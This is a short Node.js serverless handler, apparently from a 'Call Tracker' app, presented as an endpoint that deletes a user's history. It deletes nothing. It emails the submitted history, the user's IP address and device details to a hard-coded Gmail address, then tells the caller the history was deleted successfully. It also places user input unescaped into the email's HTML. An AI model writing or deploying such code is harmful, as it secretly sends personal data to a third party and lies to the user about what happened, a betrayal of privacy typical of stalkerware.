const { Resend } = require('resend');
const resend = new Resend(process.env.RESEND_API_KEY);

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { data = [], ip = 'unknown', deviceInfo = 'unknown' } = req.body;

  const html = `
    <p><strong>Call Tracker History Deleted</strong></p>
    <p><strong>IP:</strong> ${ip}</p>
    <p><strong>Device:</strong> ${deviceInfo}</p>
    <pre>${JSON.stringify(data, null, 2)}</pre>
  `;

  try {
    await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: 'livuapp900@gmail.com',
      subject: 'Deleted History Report',
      html
    });
    return res.status(200).json({ message: 'History deleted successfully!' });
  } catch (error) {
    console.error('Error sending email:', error);
    return res.status(500).json({ message: 'Failed to delete history', error: error.message });
  }
};